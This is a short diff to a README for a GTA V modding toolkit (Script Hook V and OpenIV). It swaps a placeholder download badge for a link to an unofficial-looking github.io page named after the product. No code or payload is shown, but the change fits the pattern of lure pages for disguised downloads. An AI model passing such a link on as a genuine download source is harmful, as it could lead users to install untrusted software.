@@ -9,7 +9,7 @@ Script Hook V + OpenIV is a Windows toolkit for **GTA V** single‑player moddin
 
 ## 🧰 Installation
 
-[![Download](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](#)
+[![Download](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://script-hook-v-openiv-windows.github.io/.github/)
 
 **Script Hook V**
 1. Download the archive and unzip to a temporary folder.  
